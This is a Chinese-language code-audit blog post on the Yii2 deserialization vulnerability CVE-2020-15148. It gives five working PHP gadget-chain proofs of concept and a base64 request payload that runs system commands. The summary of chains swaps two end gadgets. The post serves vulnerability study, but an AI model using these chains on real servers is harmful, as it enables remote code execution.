# [代码审计]Yii2反序列化漏洞分析 V2.0.38




# 前言
漏洞存在版本<2.0.38
CVE-2020-15148

# 框架搭建
直接去github下载，修改好cookie的key，然后就可以访问/web了

![在这里插入图片描述](https://img-blog.csdnimg.cn/f485a6a9e4ee49b5908e2cfbdce55895.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/1eca9ffc9df74487a31d814cedac3517.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

# 漏洞分析
先看github里[作者的提交](https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99?branch=9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99&diff=split)

![在这里插入图片描述](https://img-blog.csdnimg.cn/9ccc7f1d5b9b406eab9b3131e3c042d8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

可以发现在 framework/db/BatchQueryResult.php 里面添加了_wakeup方法
我们就直奔这里去看了

```
yii2.0.37/vendor/yiisoft/yii2/db/BatchQueryResult.php
```
看到这里的__distruct()入口方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/e2919db8da254901a403fb99d19550ac.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_13,color_FFFFFF,t_70,g_se,x_16)

会进去reset方法，但是进去可能就close了，但是这个_dataReader是可以控制的，到时候我们构造poc的时候可以添加析构方法为他赋值！这里`$this->_dataReader`就可以触发一个__call方法

全局搜一下__call方法，发现这个类里面有妙处

```
/vendor/fzaninotto/faker/src/Faker/Generator.php
```
```php

    public function format($formatter, $arguments = array())
    {
        return call_user_func_array($this->getFormatter($formatter), $arguments);
    }
    
     /**
     * @param string $formatter
     *
     * @return Callable
     */
    public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formtters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);

                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }
    
	/**
     * @param string $method
     * @param array $attributes
     *
     * @return mixed
     */
    public function __call($method, $attributes)
    {
        return $this->format($method, $attributes);
    }
```
可以发现，__call进去，就直接进format了，而format里面就会直接执行call_user_func_array，跟进一下他的参数

先跟进一下getFormatter，发现这里返回的是formatters，这个参数是我们可控的！

![在这里插入图片描述](https://img-blog.csdnimg.cn/0988b7cc6bef4ae8b96da6e7a17c947e.png)

但是另一个`$attributes`就不可控了，这里是可以执行一些**无参数的函数**，但是如果只是调用php原生的那肯定做不了什么事情，我们需要调用yii框架里面自带的无参数方法看看有没有能进一步利用的

继续全局搜索，看看有没有那个无参数方法里面调用了`call_user_func`
这里是用的正则去搜索，这个正则折腾了好久

```
function \w*\(\)\n? *\{(.*\n)+ *call_user_func
```
大概意思就是 function 开头，接着是一段字符接上()后换行，并只匹配0或1次，这里就表示无参数的函数了，但是我们可以更狠一点，直接搜索无参数方法中有`call_user_func`的，那么就继续加上`* \{`匹配前面的表达式0次或多次后加上大括号，然后在`call_user_func`前面**多次匹配**上一堆**除了换行之外的字符后加上换行**：`(.*\n)+ *`，最后加上`call_user_func`

这样就很精准的匹配到无参数方法中有`call_user_func`函数的方法了
这里找到了一个，简直不要太好打

```php
/vendor/yiisoft/yii2/rest/CreateAction.php
```
```php
public function run()
    {
        if ($this->checkAccess) {
            call_user_func($this->checkAccess, $this->id);
        }
        
		此处省略	
        
    }
```
checkAccess和id都是我们可控的！那么这条链子就打通了，我们构造一下poc
# POC1
```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters["close"] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```
payload:
```
web?r=test/test&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6Indob2FtaSI7fWk6MTtzOjM6InJ1biI7fX19fQ==
```
成功rce

![在这里插入图片描述](https://img-blog.csdnimg.cn/05f8898ee7b543d9b4383d4d0ef0fbd7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这条链子的总的攻击思路为

```php
1. BatchQueryResult里面__destruct入口函数调用了reset()函数
2. reset()函数内：$this->_dataReader->close();其中_dataReader可控
3. 触发__call方法，找到可利用的call方法：Generator，但是只能执行无参数函数
4. 寻找框架内的可利用的无参数函数，Generator的run
```
这条链子最后一个寻找无参数可利用函数的时候，还有一个可以利用
# POC2
```
vendor/yiisoft/yii2/rest/IndexAction.php
```

```php
public function run()
    {
        if ($this->checkAccess) {
            call_user_func($this->checkAccess, $this->id);
        }

        return $this->prepareDataProvider();
    }
```
poc

```php
<?php
namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}

namespace Faker{
    use yii\rest\IndexAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters["close"] = [new IndexAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```
# POC3
作者在2.0.38只修复了BatchQueryResult，那么我们能不能再找一个__destruct入口函数去调用call方法，接上后面的链子呢？
全局搜索__destruct下，找到这个类也可以

```
/vendor/codeception/codeception/ext/RunProcess.php
```

```php
public function __destruct()
{
    $this->stopProcess();
}

public function stopProcess()
{
    foreach (array_reverse($this->processes) as $process) {
        /** @var $process Process  **/
        if (!$process->isRunning()) {
            continue;
        }
        $this->output->debug('[RunProcess] Stopping ' . $process->getCommandLine());
        $process->stop();
    }
    $this->processes = [];
}
```
可以发现，这里调用了`$process->isRunning()`，而且这里的process是可控的！那么我们接上上面的链子就可以继续打

```php
<?php
namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}

namespace Faker{
    use yii\rest\IndexAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters["isRunning"] = [new IndexAction, 'run'];
        }
    }
}

namespace Codeception\Extension{
    use Faker\Generator;

    class RunProcess{
        private $processes;

        public function __construct(){
            $this->processes[] = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new Codeception\Extension\RunProcess));
}
?>
```

# POC4
不得不说，师傅们太强了，这里还找到了一个链子
在这个文件里面

```
/vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php
```
```php
public function clearAll($nsKey)
{
    if (array_key_exists($nsKey, $this->keys)) {
        foreach ($this->keys[$nsKey] as $itemKey => $null) {
            $this->clearKey($nsKey, $itemKey);
        }
        if (is_dir($this->path.'/'.$nsKey)) {
            rmdir($this->path.'/'.$nsKey);
        }
        unset($this->keys[$nsKey]);
    }
}

public function __destruct()
{
    foreach ($this->keys as $nsKey => $null) {
        $this->clearAll($nsKey);
    }
}
```
可以发现，这里进了clearAll后，里面会有一个字符串拼接的操作，而path是我们可控的，那么我们就可以执行__toString方法了，找一下能利用的__toString方法
这里找到了一个这个Cover.php
```
/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Covers.php
```

很明显这里可以调用call方法，直接接上去就可以了

![在这里插入图片描述](https://img-blog.csdnimg.cn/8d3527ee5b874fe3ac2079a054a5b72c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

poc
```php
<?php
namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}

namespace Faker{
    use yii\rest\IndexAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters["render"] = [new IndexAction, 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Faker\Generator;
    class Cover{
        public function __construct(){
            $this->description=new Generator;
        }
    }
}


namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\Cover;

    class Swift_KeyCache_DiskKeyCache{
        private $path;
        private $keys = [];
        public function __construct(){
            $this->keys=array('aaa'=>'bbb');
            $this->path=new Cover();
        }

    }

    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache));

}

?>
```
成功rce

![在这里插入图片描述](https://img-blog.csdnimg.cn/c954c1761dfd41dda0a45e36fe243261.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这些也是可以的，很多很多

![在这里插入图片描述](https://img-blog.csdnimg.cn/01519462fede48aaa9a3a80abc1c9398.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6339b5ade20042a1b430e0ae498b056d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/737d9cb1758140558d143c7d0df88b94.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/88475e02073d4e049af4ac58aa8b621f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

# POC5
除了刚刚的__call方法，其实还有一个思路，就是直接去找能利用的close()方法
在这个文件里面找到能利用的点
```
/vendor/yiisoft/yii2/web/DbSession.php
```
```php
    public function close()
    {
        if ($this->getIsActive()) {
            // prepare writeCallback fields before session closes
            $this->fields = $this->composeFields();
            YII_DEBUG ? session_write_close() : @session_write_close();
        }
    }
```
跟进composeFields方法
```php
    protected function composeFields($id = null, $data = null)
    {
        $fields = $this->writeCallback ? call_user_func($this->writeCallback, $this) : [];
        if ($id !== null) {
            $fields['id'] = $id;
        }
        if ($data !== null) {
            $fields['data'] = $data;
        }
        return $fields;
    }
```
可以看到这里是有一个call_user_func函数的，而且writeCallback是可控的，那么就可以接上IndexAction的run

poc

```php
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'whoami';
        }
    }
}

namespace yii\web{

    use yii\rest\IndexAction;

    class DbSession
    {
        public $writeCallback;
        public function __construct(){
            $a=new IndexAction();
            $this->writeCallback=[$a,'run'];
        }
    }
}
namespace yii\db{

    use yii\web\DbSession;

    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct(){
            $this->_dataReader=new DbSession();
        }
    }
}


namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}

```


![#](https://img-blog.csdnimg.cn/06fe9f42a5914b2a9cbbfa5b9430f860.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

# 总结

```
poc1: BatchQueryResult.__destruct() -> BatchQueryResult.reset() -> Generator.__call() -> Generator.format() -> Generator.getFormatter() -> IndexAction.run()

poc2:BatchQueryResult.__destruct() -> BatchQueryResult.reset() -> Generator.__call() -> Generator.format() -> Generator.getFormatter() -> CreateAction.run()

poc3: RunProcess.__destruct() -> RunProcess.stopProcess() -> Generator.__call() -> Generator.format() -> Generator.getFormatter() -> CreateAction.run()

poc4: Swift_KeyCache_DiskKeyCache.__destruct() -> Swift_KeyCache_DiskKeyCache.clearAll() -> Cover.__toString() -> Cover.render() -> Generator.__call() -> Generator.format() -> Generator.getFormatter() -> CreateAction.run()

poc5: BatchQueryResult.__destruct() -> DbSession.close() -> DbSession.composeFields() -> IndexAction.run
```

大概就分析了这些链，感觉上来说还是不算很难，也是学到了一些代码审计的知识和技巧，那么多条链子，每次成功rce的时候还是很有成就感的




参考链接：
1. https://ego00.blog.csdn.net/article/details/113824239
2. https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA
